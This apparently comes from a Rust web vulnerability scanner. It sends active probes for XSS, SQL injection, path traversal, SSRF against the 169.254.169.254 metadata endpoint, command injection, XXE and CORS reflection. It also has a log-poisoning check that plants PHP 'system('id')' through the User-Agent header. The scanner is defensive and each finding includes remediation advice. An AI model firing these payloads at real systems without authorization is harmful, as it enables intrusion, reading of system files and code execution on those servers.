use crate::core::HttpClient;
use crate::models::{Finding, HttpData, Severity};
use tracing::debug;

/// Entry point — run active checks based on intensity level
pub async fn run_active_checks(
    client: &HttpClient,
    url: &str,
    data: &HttpData,
    intensity_level: u8,
    skip_checks: &[String],
) -> Vec<Finding> {
    let mut findings = Vec::new();

    if skip_checks.contains(&"active".to_string()) {
        return findings;
    }

    let injection_points = extract_all_injection_points(url, data);

    // CORS origin reflection (level 2)
    if intensity_level >= 2 && !skip_checks.contains(&"active-cors".to_string()) {
        findings.extend(check_cors_preflight(client, url).await);
        findings.extend(check_cors_origin_reflection(client, url).await);
    }

    if injection_points.is_empty() {
        debug!("No injection points found for active checks on {}", url);
        return findings;
    }

    // Level 2 checks
    if intensity_level >= 2 {
        if !skip_checks.contains(&"active-xss".to_string()) {
            findings.extend(check_xss_reflection(client, &injection_points).await);
        }
        if !skip_checks.contains(&"active-sqli".to_string()) {
            findings.extend(check_sqli_error_based(client, &injection_points).await);
        }
        if !skip_checks.contains(&"active-path".to_string()) {
            findings.extend(check_path_traversal(client, &injection_points).await);
        }
    }

    // Level 3 checks (heavier/slower)
    if intensity_level >= 3 {
        if !skip_checks.contains(&"active-xss".to_string()) {
            findings.extend(check_advanced_xss(client, &injection_points).await);
        }
        if !skip_checks.contains(&"active-sqli".to_string()) {
            findings.extend(check_blind_sqli_timing(client, &injection_points).await);
        }
        if !skip_checks.contains(&"active-ssrf".to_string()) {
            findings.extend(check_ssrf_probes(client, &injection_points).await);
        }
        if !skip_checks.contains(&"active-cmdi".to_string()) {
            findings.extend(check_command_injection(client, &injection_points).await);
        }
        if !skip_checks.contains(&"active-xxe".to_string()) {
            findings.extend(check_xxe_injection(client, &injection_points).await);
        }
        if !skip_checks.contains(&"active-path".to_string()) {
            findings.extend(check_lfi_to_rce(client, &injection_points).await);
        }
    }

    // POST body injection for all intensity levels >= 2
    if intensity_level >= 2 && !skip_checks.contains(&"active-post".to_string()) {
        findings.extend(check_post_body_injection(client, url, data).await);
    }

    findings
}

// ── Injection point extraction ──

#[derive(Debug, Clone)]
struct InjectionPoint {
    param: String,
    url: String,
}

fn extract_url_params(url: &str, data: &HttpData) -> Vec<InjectionPoint> {
    let mut points = Vec::new();

    if let Ok(parsed) = url::Url::parse(url) {
        for (key, _value) in parsed.query_pairs() {
            if !key.is_empty() {
                points.push(InjectionPoint {
                    param: key.to_string(),
                    url: url.to_string(),
                });
            }
        }
    }

    for form in &data.forms {
        let base_url = form.action.as_deref().unwrap_or(url);
        for field in &form.visible_fields {
            points.push(InjectionPoint {
                param: field.name.clone(),
                url: base_url.to_string(),
            });
        }
    }

    points
}

/// Extract all injection points including POST body parameters
fn extract_all_injection_points(url: &str, data: &HttpData) -> Vec<InjectionPoint> {
    extract_url_params(url, data)
}

fn inject_param(base_url: &str, param: &str, value: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(base_url) {
        let mut pairs: Vec<(String, String)> = parsed
            .query_pairs()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();

        let mut found = false;
        for (k, v) in pairs.iter_mut() {
            if *k == param {
                *v = value.to_string();
                found = true;
                break;
            }
        }
        if !found {
            pairs.push((param.to_string(), value.to_string()));
        }

        let query: Vec<String> = pairs
            .iter()
            .map(|(k, v)| format!("{}={}", urlencoding(k), urlencoding(v)))
            .collect();
        parsed.set_query(Some(&query.join("&")));
        parsed.to_string()
    } else {
        if base_url.contains('?') {
            format!("{}&{}={}", base_url, urlencoding(param), urlencoding(value))
        } else {
            format!("{}?{}={}", base_url, urlencoding(param), urlencoding(value))
        }
    }
}

fn urlencoding(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes()).collect()
}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;")
        .replace('"', "&quot;")
}

// ── Level 2: CORS preflight ──

async fn check_cors_preflight(client: &HttpClient, url: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    match client.send_custom_request("OPTIONS", url).await {
        Ok(response) => {
            if let Some(aco) = response.headers.get("access-control-allow-origin") {
                if aco == "*" {
                    if let Some(acac) = response.headers.get("access-control-allow-credentials") {
                        if acac == "true" {
                            findings.push(Finding::new(
                                "active-cors",
                                "Insecure CORS: wildcard origin with credentials",
                                Severity::High,
                                "CORS allows any origin (*) with credentials enabled, which browsers reject but signals dangerous misconfiguration.",
                                format!("Access-Control-Allow-Origin: {}, Access-Control-Allow-Credentials: {}", aco, acac),
                                "Use specific origins instead of wildcard when credentials are enabled.",
                                url,
                            ));
                        }
                    }
                }
            }

            if let Some(methods) = response.headers.get("access-control-allow-methods") {
                let upper = methods.to_uppercase();
                if upper.contains("PUT") || upper.contains("DELETE") || upper.contains("PATCH") {
                    findings.push(Finding::new(
                        "active-cors",
                        "CORS allows dangerous HTTP methods",
                        Severity::Low,
                        format!("CORS preflight response allows: {}", methods),
                        format!("Access-Control-Allow-Methods: {}", methods),
                        "Restrict CORS methods to only those required (GET, POST, HEAD).",
                        url,
                    ));
                }
            }
        }
        Err(_) => {}
    }

    findings
}

// ── Level 2: XSS Reflection ──

async fn check_xss_reflection(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let payloads = [
        "<offsecXSS{id}>",
        "\"><offsecXSS{id}>",
        "';offsecXSS{id}//",
    ];

    for point in points.iter().take(5) {
        for template in &payloads {
            let id = format!("{:04x}", rand::random::<u16>());
            let payload = template.replace("{id}", &id);
            let marker = format!("<offsecXSS{}>", id);
            let test_url = inject_param(&point.url, &point.param, &payload);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        if body.contains(&marker) {
                            let escaped_marker = html_escape(&marker);
                            if !body.contains(&escaped_marker) {
                                findings.push(Finding::new(
                                    "active-xss",
                                    "Reflected XSS vulnerability detected",
                                    Severity::High,
                                    format!(
                                        "Parameter '{}' reflects unsanitized input. Payload '{}' returned unescaped in the response.",
                                        point.param, marker
                                    ),
                                    format!("URL: {}\nPayload: {}\nReflected content found unescaped.", test_url, payload),
                                    "Implement context-aware output encoding. Use templates with auto-escaping (e.g., Handlebars, React JSX).",
                                    &test_url,
                                ));
                                break;
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}

// ── Level 2: SQLi Error-Based ──

async fn check_sqli_error_based(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let payloads = ["'", "\"", "' OR '1'='1", "' UNION SELECT NULL--", "1' OR 1=1--"];

    let sql_error_patterns = [
        "sql syntax", "mysql_fetch", "mysql error", "ora-", "postgresql",
        "sqlite3::", "pdoexception", "sqlsrv", "odbc_exec",
        "unclosed quotation mark", "warning: mysql", "warning: pg_",
        "microsoft ole db", "invalid query",
    ];

    for point in points.iter().take(5) {
        for payload in &payloads {
            let test_url = inject_param(&point.url, &point.param, payload);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        let body_lower = body.to_lowercase();
                        for pattern in &sql_error_patterns {
                            if body_lower.contains(pattern) {
                                findings.push(Finding::new(
                                    "active-sqli",
                                    "Potential SQL injection (error-based)",
                                    Severity::High,
                                    format!(
                                        "Parameter '{}' with payload '{}' triggered a database error pattern ('{}').",
                                        point.param, payload, pattern
                                    ),
                                    format!("URL: {}\nPayload: {}\nFound: {}", test_url, payload, pattern),
                                    "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                                    &test_url,
                                ));
                                break;
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}

// ── Level 2: Path Traversal ──

async fn check_path_traversal(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "/etc/passwd",
        "file:///etc/passwd",
    ];

    let success_markers = [
        "root:", "bin/bash", "daemon:", "[extensions]", "[fonts]",
    ];

    for point in points.iter().take(5) {
        for payload in &payloads {
            let test_url = inject_param(&point.url, &point.param, payload);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        let body_lower = body.to_lowercase();
                        for marker in &success_markers {
                            if body_lower.contains(marker) {
                                findings.push(Finding::new(
                                    "active-path",
                                    "Path traversal vulnerability detected",
                                    Severity::Critical,
                                    format!(
                                        "Parameter '{}' with payload '{}' returned file contents (found '{}').",
                                        point.param, payload, marker
                                    ),
                                    format!("URL: {}\nPayload: {}\nFile content matched: {}", test_url, payload, marker),
                                    "Validate and sanitize file path parameters. Use a whitelist of allowed paths. Never pass user input directly to file operations.",
                                    &test_url,
                                ));
                                break;
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}

// ── Level 3: Advanced XSS ──

async fn check_advanced_xss(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let payloads = [
        "javascript:alert(1)",
        "<img src=x onerror=prompt(1)>",
        "<svg onload=alert(1)>",
        "\" autofocus onfocus=alert(1) x=\"",
        "{{constructor.constructor('alert(1)')()}}",
    ];

    for point in points.iter() {
        for payload in &payloads {
            let test_url = inject_param(&point.url, &point.param, payload);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        if body.contains(payload) || body.contains("onerror=") || body.contains("onfocus=") {
                            findings.push(Finding::new(
                                "active-xss",
                                "Advanced XSS vector reflected",
                                Severity::High,
                                format!(
                                    "Parameter '{}' reflects a complex XSS payload without encoding.",
                                    point.param
                                ),
                                format!("URL: {}\nPayload: {}", test_url, payload),
                                "Use a strict Content-Security-Policy and context-aware output encoding.",
                                &test_url,
                            ));
                            break;
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}

// ── Level 3: Blind SQLi Timing ──

async fn check_blind_sqli_timing(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let timing_payloads = [
        ("MySQL", "' OR SLEEP(3)--"),
        ("PostgreSQL", "' OR pg_sleep(3)--"),
        ("MSSQL", "' WAITFOR DELAY '0:0:3'--"),
    ];

    for point in points.iter().take(3) {
        // Baseline measurement
        let baseline_url = inject_param(&point.url, &point.param, "normal");
        let baseline_start = std::time::Instant::now();
        let _ = client.fetch_url(&baseline_url).await;
        let baseline_time = baseline_start.elapsed().as_millis();

        for (db_type, payload) in &timing_payloads {
            let test_url = inject_param(&point.url, &point.param, payload);
            let test_start = std::time::Instant::now();
            let _ = client.fetch_url(&test_url).await;
            let test_time = test_start.elapsed().as_millis();

            if test_time >= baseline_time + 2500 {
                findings.push(Finding::new(
                    "active-sqli",
                    "Potential blind SQL injection (time-based)",
                    Severity::Critical,
                    format!(
                        "Parameter '{}' with {} timing payload '{}' caused a {}ms delay (baseline: {}ms).",
                        point.param, db_type, payload, test_time, baseline_time
                    ),
                    format!(
                        "URL: {}\nPayload: {}\nBaseline: {}ms, Test: {}ms, Delta: {}ms",
                        test_url, payload, baseline_time, test_time, test_time - baseline_time
                    ),
                    "Use parameterized queries. Time-based delays confirm SQL execution.",
                    &test_url,
                ));
            }
        }
    }

    findings
}

// ── Level 3: SSRF Probes ──

async fn check_ssrf_probes(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let ssrf_payloads = [
        ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
        ("Localhost HTTP", "http://127.0.0.1:80/"),
        ("Localhost alt", "http://0.0.0.0:80/"),
        ("Localhost IPv6", "http://[::1]:80/"),
    ];

    let ssrf_markers = [
        "ami-id", "instance-id", "security-groups",
        "Apache", "nginx", "IIS", "localhost",
    ];

    for point in points.iter().take(3) {
        for (label, payload) in &ssrf_payloads {
            let test_url = inject_param(&point.url, &point.param, payload);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        let body_lower = body.to_lowercase();
                        for marker in &ssrf_markers {
                            if body_lower.contains(marker) {
                                findings.push(Finding::new(
                                    "active-ssrf",
                                    "Potential SSRF vulnerability",
                                    Severity::Critical,
                                    format!(
                                        "Parameter '{}' with {} payload returned content matching '{}'. The server may be making requests to internal resources.",
                                        point.param, label, marker
                                    ),
                                    format!("URL: {}\nPayload: {}\nResponse contained: {}", test_url, payload, marker),
                                    "Validate all URL inputs against a whitelist. Block requests to internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 169.254.169.254, etc.).",
                                    &test_url,
                                ));
                                break;
                            }
                        }
                    }

                    // Also flag unexpected 200 responses to internal resources
                    if response.status_code == 200 && response.body_size > 100 {
                        findings.push(Finding::new(
                            "active-ssrf",
                            "Successful request to internal address via SSRF",
                            Severity::High,
                            format!(
                                "Parameter '{}' with {} payload returned HTTP 200 with {} bytes. Likely SSRF.",
                                point.param, label, response.body_size
                            ),
                            format!("URL: {}\nResponse: HTTP {} with {} bytes", test_url, response.status_code, response.body_size),
                            "Implement SSRF protection: block internal IPs, validate URL schemes, use DNS-based allowlisting.",
                            &test_url,
                        ));
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}

// ── Level 3: Command Injection ──

async fn check_command_injection(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let cmd_payloads = [
        ("Linux ping", "; ping -c 3 127.0.0.1"),
        ("Linux sleep", "; sleep 3"),
        ("Windows ping", "| ping -n 3 127.0.0.1"),
        ("Backtick Linux", "`sleep 3`"),
        ("Subshell", "$(sleep 3)"),
    ];

    for point in points.iter().take(3) {
        let baseline_url = inject_param(&point.url, &point.param, "normal");
        let baseline_start = std::time::Instant::now();
        let _ = client.fetch_url(&baseline_url).await;
        let baseline_time = baseline_start.elapsed().as_millis();

        for (label, payload) in &cmd_payloads {
            let test_url = inject_param(&point.url, &point.param, payload);
            let test_start = std::time::Instant::now();
            let _ = client.fetch_url(&test_url).await;
            let test_time = test_start.elapsed().as_millis();

            if test_time >= baseline_time + 2500 {
                findings.push(Finding::new(
                    "active-cmdi",
                    "Potential command injection (time-based)",
                    Severity::Critical,
                    format!(
                        "Parameter '{}' with {} payload '{}' caused a {}ms delay (baseline: {}ms).",
                        point.param, label, payload, test_time, baseline_time
                    ),
                    format!(
                        "URL: {}\nPayload: {}\nBaseline: {}ms, Test: {}ms, Delta: {}ms",
                        test_url, payload, baseline_time, test_time, test_time - baseline_time
                    ),
                    "Never pass user input to shell/command execution functions. Use exec() with argument arrays (not shell strings).",
                    &test_url,
                ));
            }
        }
    }

    findings
}

// ── Level 3: XXE Injection ──

async fn check_xxe_injection(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let xxe_payloads = [
        r#"<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#,
        r#"<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>"#,
    ];

    let xxe_markers = ["root:", "bin/bash", "daemon:"];

    for point in points.iter().take(3) {
        for payload in &xxe_payloads {
            let test_url = inject_param(&point.url, &point.param, payload);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        for marker in &xxe_markers {
                            if body.contains(marker) {
                                findings.push(Finding::new(
                                    "active-xxe",
                                    "XML External Entity (XXE) injection detected",
                                    Severity::Critical,
                                    format!(
                                        "Parameter '{}' with XXE payload triggered file read (found '{}').",
                                        point.param, marker
                                    ),
                                    format!("URL: {}\nPayload: {}\nResponse contained: {}", test_url, payload, marker),
                                    "Disable XML external entity processing. Set libxml_disable_entity_loader(true) in PHP, use DocumentBuilderFactory with XXE disabled in Java.",
                                    &test_url,
                                ));
                                break;
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}

// ── CORS Origin Reflection ──

async fn check_cors_origin_reflection(client: &HttpClient, url: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    let test_origins = [
        ("https://evil.com", "Arbitrary origin"),
        ("null", "Null origin"),
        ("https://evil.com.evil", "Subdomain-like origin"),
    ];

    for (origin, label) in &test_origins {
        match client.send_custom_request_with_header("GET", url, "Origin", origin).await {
            Ok(response) => {
                if let Some(acao) = response.headers.get("access-control-allow-origin") {
                    if acao == *origin {
                        findings.push(Finding::new(
                            "active-cors",
                            format!("CORS origin reflection: {}", label),
                            Severity::High,
                            format!("The server reflects the Origin '{}' back in Access-Control-Allow-Origin, allowing any website to make authenticated cross-origin requests.", origin),
                            format!("Sent Origin: {}\nReceived ACAO: {}", origin, acao),
                            "Never reflect the Origin header. Use a strict whitelist of allowed origins.",
                            url,
                        ));
                        break;
                    }
                    if acao == "null" && *origin == "null" {
                        findings.push(Finding::new(
                            "active-cors",
                            "CORS allows null origin",
                            Severity::Medium,
                            "ACAO: null for null Origin. Sandboxed iframes can send null Origin, enabling CORS attacks.",
                            "ACAO: null for null Origin request",
                            "Do not allow 'null' origin. Use a strict origin whitelist.",
                            url,
                        ));
                        break;
                    }
                }
            }
            Err(_) => continue,
        }
    }

    findings
}

// ── POST Body Injection ──

async fn check_post_body_injection(client: &HttpClient, url: &str, data: &HttpData) -> Vec<Finding> {
    let mut findings = Vec::new();

    for form in &data.forms {
        let action = form.action.as_deref().unwrap_or(url);
        if action.is_empty() || !form.method.to_lowercase().contains("post") {
            continue;
        }

        let mut body_params: Vec<(String, String)> = form.visible_fields
            .iter()
            .map(|f| (f.name.clone(), String::new()))
            .collect();

        if body_params.is_empty() {
            body_params.push(("q".to_string(), String::new()));
        }

        for (param, _) in body_params.iter().take(3) {
            let id = format!("{:04x}", rand::random::<u16>());
            let xss_payload = format!("<offsecPOST{}>", id);

            let mut test_params = body_params.clone();
            for (p, v) in test_params.iter_mut() {
                if p == param { *v = xss_payload.clone(); }
            }

            match client.send_custom_request_form("POST", action, &test_params).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        if body.contains(&xss_payload) {
                            findings.push(Finding::new(
                                "active-xss",
                                "Reflected XSS via POST body parameter",
                                Severity::High,
                                format!("POST parameter '{}' reflects unsanitized input.", param),
                                format!("Action: {}\nParam: {}\nPayload reflected", action, param),
                                "Apply output encoding to all parameters regardless of HTTP method.",
                                action,
                            ));
                        }
                    }
                }
                Err(_) => continue,
            }
        }
    }

    findings
}

// ── LFI → RCE via Log Poisoning ──

async fn check_lfi_to_rce(client: &HttpClient, points: &[InjectionPoint]) -> Vec<Finding> {
    let mut findings = Vec::new();

    let log_paths = [
        ("Apache access log", "/var/log/apache2/access.log"),
        ("Nginx access log", "/var/log/nginx/access.log"),
        ("Apache error log", "/var/log/apache2/error.log"),
        ("Auth log", "/var/log/auth.log"),
        ("Syslog", "/var/log/syslog"),
    ];

    let log_markers: &[(&str, &[&str])] = &[
        ("Apache access", &["GET /", "HTTP/1.", "Mozilla"]),
        ("Nginx access", &["GET /", "HTTP/1.", "nginx"]),
        ("Apache error", &["[error]", "[warn]", "mod_"]),
        ("Auth log", &["sshd", "pam_unix", "authentication"]),
    ];

    for point in points.iter().take(5) {
        for (log_name, log_path) in &log_paths {
            let traversal = format!("../../../../..{}", log_path);
            let test_url = inject_param(&point.url, &point.param, &traversal);

            match client.fetch_url(&test_url).await {
                Ok(response) => {
                    if let Some(ref body) = response.body {
                        for (_marker_name, markers) in log_markers {
                            for marker in *markers {
                                if body.contains(marker) {
                                    findings.push(Finding::new(
                                        "active-path",
                                        format!("LFI: {} exposed via path traversal", log_name),
                                        Severity::Critical,
                                        format!("Parameter '{}' allows reading {} (marker: '{}'). Log poisoning → RCE is possible by injecting PHP via User-Agent into logs.", point.param, log_name, marker),
                                        format!("URL: {}\nLog path: {}\nMarker: {}", test_url, log_path, marker),
                                        "Block path traversal. Disable allow_url_include in PHP. Ensure logs are not web-readable.",
                                        &test_url,
                                    ));
                                    break;
                                }
                            }
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        // Log poisoning: inject PHP into User-Agent then try to include log
        if !findings.is_empty() {
            let poison_ua = "offsec-<?php system('id');?>";
            match client.fetch_url_with_ua(&point.url, poison_ua).await {
                Ok(_) => {
                    findings.push(Finding::new(
                        "active-path",
                        "Log poisoning: PHP code injected via User-Agent for LFI→RCE",
                        Severity::High,
                        "A PHP payload was sent in the User-Agent header. If a log containing this is accessible via LFI, it executes server-side.",
                        format!("User-Agent sent: {}", poison_ua),
                        "Prevent LFI by validating file paths. Block PHP execution in log directories.",
                        &point.url,
                    ));
                }
                Err(_) => {}
            }
        }
    }

    findings
}
